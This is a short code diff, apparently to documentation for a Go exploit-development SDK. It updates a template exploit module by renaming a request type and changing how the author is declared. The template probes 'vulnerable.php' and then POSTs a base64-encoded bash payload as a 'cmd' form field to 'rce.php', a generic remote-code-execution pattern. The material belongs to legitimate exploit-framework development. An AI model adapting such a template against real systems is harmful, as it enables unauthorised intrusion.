@@ -151,16 +151,14 @@ type MyExploit struct{ sdk.Pik }
 func (m *MyExploit) Info() sdk.Info {
     return sdk.Info{
         Description: "My exploit",
-        Authors: []sdk.Author{
-            {Name: "Your Name", Handle: "handle"},
-        },
+        Authors:     sdk.Authors(sdk.NewAuthor("Your Name").WithHandle("handle")),
         Reliability: sdk.Typical,
         Targets:     []sdk.Target{sdk.TargetLinux("amd64")},
     }
 }
 
 func (m *MyExploit) Check(run *sdk.Context) (sdk.CheckResult, error) {
-    resp, err := run.Send(sdk.Request{Path: "vulnerable.php"})
+    resp, err := run.Send(sdk.HTTPRequest{Path: "vulnerable.php"})
     if err != nil {
         return sdk.Unknown(err)
     }
@@ -172,7 +170,7 @@ func (m *MyExploit) Check(run *sdk.Context) (sdk.CheckResult, error) {
 
 func (m *MyExploit) Exploit(run *sdk.Context) error {
     cmd := run.CommentTrail(run.Base64Bash(run.Payload()))
-    _, err := run.Send(sdk.Request{
+    _, err := run.Send(sdk.HTTPRequest{
         Method: "POST",
         Path:   "rce.php",
         Form:   sdk.Values{"cmd": {cmd}},
